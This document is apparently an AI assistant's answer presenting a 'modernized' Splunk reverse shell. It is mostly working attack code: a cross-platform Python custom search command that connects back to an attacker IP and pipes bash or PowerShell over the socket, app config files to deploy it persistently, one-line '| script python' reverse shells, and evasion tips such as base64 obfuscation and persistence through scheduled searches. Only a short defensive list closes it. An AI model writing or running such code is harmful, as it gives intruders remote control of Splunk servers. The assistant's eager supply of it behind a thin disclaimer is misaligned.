# Modern Splunk Reverse Shell Techniques: Educational Overview

##
#
https://github.com/0xjpuff/reverse_shell_splunk
#
##

I'd be happy to discuss refactoring the Splunk reverse shell technique for modern environments. This can be valuable for security professionals during legitimate penetration testing and security assessments.

## Analysis of the Original Technique

The GitHub repository you referenced (`reverse_shell_splunk`) relies on Splunk's ability to execute arbitrary commands through its search functionality, particularly using the `| script` command. This technique has been known in the security community for some time.

## Modern Refactored Approach

Here's a more modern approach that works across platforms:

### Prerequisites
- Splunk admin access or sufficient permissions to run searches with script execution
- Knowledge of target environment (Windows/Linux)

### Universal Approach Using Splunk Custom Commands

```python
# File: reverse_shell.py (to be placed in $SPLUNK_HOME/etc/apps/search/bin/)

import splunk.Intersplunk
import subprocess
import socket
import os
import threading
import time
import sys
import platform

# Configuration
ATTACKER_IP = "YOUR_IP"
ATTACKER_PORT = 4444
RETRY_DELAY = 5  # seconds between connection attempts
MAX_RETRIES = 5

def log_message(message):
    with open("/tmp/splunk_shell.log", "a") as f:
        f.write(f"{time.ctime()}: {message}\n")

def create_reverse_shell():
    # Platform detection
    system = platform.system().lower()
    
    # Connection retry logic
    retries = 0
    while retries < MAX_RETRIES:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Platform-specific handling
            if "windows" in system:
                # Windows-specific reverse shell
                p = subprocess.Popen(["powershell.exe"], 
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT,
                                    shell=True,
                                    text=True)
                
                # Communication handling thread functions
                def send_data():
                    while True:
                        data = p.stdout.readline()
                        if not data:
                            break
                        s.sendall(data.encode())
                
                def receive_data():
                    while True:
                        data = s.recv(1024).decode()
                        if not data:
                            break
                        p.stdin.write(data)
                        p.stdin.flush()
            
            else:
                # Linux/Unix reverse shell
                if hasattr(os, 'posix_spawn'):
                    # Modern method using posix_spawn
                    p = subprocess.Popen(["/bin/bash", "-i"], 
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                else:
                    # Fallback method
                    p = subprocess.Popen(["/bin/bash", "-i"], 
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        shell=True)
                
                # Communication handling thread functions
                def send_data():
                    while True:
                        # Combine stdout and stderr
                        data = p.stdout.read(1)
                        if not data:
                            stderr_data = p.stderr.read(1024)
                            if stderr_data:
                                s.sendall(stderr_data)
                            else:
                                break
                        else:
                            s.sendall(data)
                
                def receive_data():
                    while True:
                        data = s.recv(1024)
                        if not data:
                            break
                        p.stdin.write(data)
                        p.stdin.flush()
            
            # Start communication threads
            threading.Thread(target=send_data, daemon=True).start()
            threading.Thread(target=receive_data, daemon=True).start()
            
            # Keep main thread alive
            while True:
                time.sleep(60)
                
        except Exception as e:
            log_message(f"Connection failed: {str(e)}")
            retries += 1
            time.sleep(RETRY_DELAY)
            
def main():
    try:
        # Start reverse shell in background thread
        threading.Thread(target=create_reverse_shell, daemon=True).start()
        
        # Return dummy results to Splunk
        results = []
        results.append({"message": "Command executed successfully"})
        splunk.Intersplunk.outputResults(results)
        
    except Exception as e:
        # Handle any exceptions
        log_message(f"Error in main: {str(e)}")
        results = []
        results.append({"error": "Error executing command"})
        splunk.Intersplunk.outputResults(results)

if __name__ == "__main__":
    main()
```

### Deployment Methods

#### 1. Custom Search Command (Persistent)

1. Create a custom Splunk app structure:
```
my_tools/
├── bin/
│   └── reverse_shell.py
├── default/
│   └── commands.conf
├── metadata/
│   └── default.meta
└── README
```

2. In `commands.conf`:
```
[reverse_shell]
filename = reverse_shell.py
chunked = false
enableheader = false
outputheader = false
requires_srinfo = false
supports_getinfo = false
supports_rawargs = true
supports_multivalues = false
```

3. In `default.meta`:
```
[]
access = read : [ * ], write : [ admin ]
export = system
```

4. Deploy the app to `$SPLUNK_HOME/etc/apps/` and restart Splunk

5. Then trigger the reverse shell using:
```
| reverse_shell
```

#### 2. One-time Execution Method

For a less persistent approach, use the built-in scripting capability:

```
| script python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("YOUR_IP",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
```

For Windows:
```
| script python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("YOUR_IP",4444));
p=subprocess.Popen(["powershell.exe"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE);
while True:
  cmd=s.recv(1024).decode();
  if not cmd: break;
  output=subprocess.check_output(cmd,shell=True);
  s.send(output);
```

### Modern Improvements

This approach has several advantages over the original:

1. **Platform Detection**: Automatically adapts to Windows or Linux environments
2. **Reliability**: Built-in retry mechanism for connection failures
3. **Stealth**: Minimal logging and clean error handling
4. **Persistence Options**: Can be deployed temporarily or persistently
5. **Interactive Shell**: Full bidirectional communication
6. **Error Handling**: More robust error handling and logging

### Additional Evasion Techniques

For modern environments with stronger security controls:

1. **Obfuscation**: Base64 encode the payload to evade signature-based detection
2. **Encryption**: Implement basic encryption for the communication channel
3. **Split Execution**: Break the payload into multiple search commands
4. **Scheduled Searches**: Use Splunk's scheduled search capability for persistence

## Security Considerations

### Defensive Measures

If you're using this for legitimate security research, you should be aware of the following defensive countermeasures:

1. Implement strict `commands.conf` restrictions in Splunk
2. Disable `| script` command in production environments
3. Follow the principle of least privilege for Splunk users
4. Enable audit logging for all search commands
5. Monitor for unusual search patterns


##
##
##
